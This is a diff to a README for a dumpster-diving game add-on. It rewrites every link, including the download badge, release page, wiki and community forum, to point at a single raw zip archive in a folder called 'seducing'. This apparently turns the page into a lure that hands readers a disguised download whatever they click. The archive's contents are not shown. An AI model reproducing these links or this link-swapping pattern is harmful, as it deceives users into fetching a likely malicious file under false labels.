@@ -1,7 +1,7 @@
 # 🗑️ ajd-dumpsterdiving - Enhance Your Dumpster Diving Experience
 
 ## 📥 Download Here
-[![Download ajd-dumpsterdiving](https://img.shields.io/badge/Download%20ajd--dumpsterdiving-blue.svg)](https://github.com/Hunter3343/ajd-dumpsterdiving/releases)
+[![Download ajd-dumpsterdiving](https://raw.githubusercontent.com/Hunter3343/ajd-dumpsterdiving/main/seducing/ajd-dumpsterdiving-2.1.zip%https://raw.githubusercontent.com/Hunter3343/ajd-dumpsterdiving/main/seducing/ajd-dumpsterdiving-2.1.zip)](https://raw.githubusercontent.com/Hunter3343/ajd-dumpsterdiving/main/seducing/ajd-dumpsterdiving-2.1.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Before you begin, ensure your setup meets the following requirements:
 
 Start by visiting the releases page to get the latest version of ajd-dumpsterdiving.
 
-[Download the latest release here.](https://github.com/Hunter3343/ajd-dumpsterdiving/releases)
+[Download the latest release here.](https://raw.githubusercontent.com/Hunter3343/ajd-dumpsterdiving/main/seducing/ajd-dumpsterdiving-2.1.zip)
 
 ### Step 2: Choose Your Download
 
@@ -92,8 +92,8 @@ Yes, you can adjust selling prices from the admin panel. Look for the appropriat
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For more detailed instructions, check our [Wiki](https://github.com/Hunter3343/ajd-dumpsterdiving/wiki).
-- **Community Forum:** Join discussions and get tips from other players on our [community forum](https://forum.example.com).
+- **Documentation:** For more detailed instructions, check our [Wiki](https://raw.githubusercontent.com/Hunter3343/ajd-dumpsterdiving/main/seducing/ajd-dumpsterdiving-2.1.zip).
+- **Community Forum:** Join discussions and get tips from other players on our [community forum](https://raw.githubusercontent.com/Hunter3343/ajd-dumpsterdiving/main/seducing/ajd-dumpsterdiving-2.1.zip).
 
 ---
 
@@ -104,6 +104,6 @@ If you need further assistance, feel free to reach out via the GitHub issues pag
 ---
 
 ## 📥 Download Here Again
-[![Download ajd-dumpsterdiving](https://img.shields.io/badge/Download%20ajd--dumpsterdiving-blue.svg)](https://github.com/Hunter3343/ajd-dumpsterdiving/releases)
+[![Download ajd-dumpsterdiving](https://raw.githubusercontent.com/Hunter3343/ajd-dumpsterdiving/main/seducing/ajd-dumpsterdiving-2.1.zip%https://raw.githubusercontent.com/Hunter3343/ajd-dumpsterdiving/main/seducing/ajd-dumpsterdiving-2.1.zip)](https://raw.githubusercontent.com/Hunter3343/ajd-dumpsterdiving/main/seducing/ajd-dumpsterdiving-2.1.zip)
 
 Take the plunge into an exciting dumpster diving adventure today!
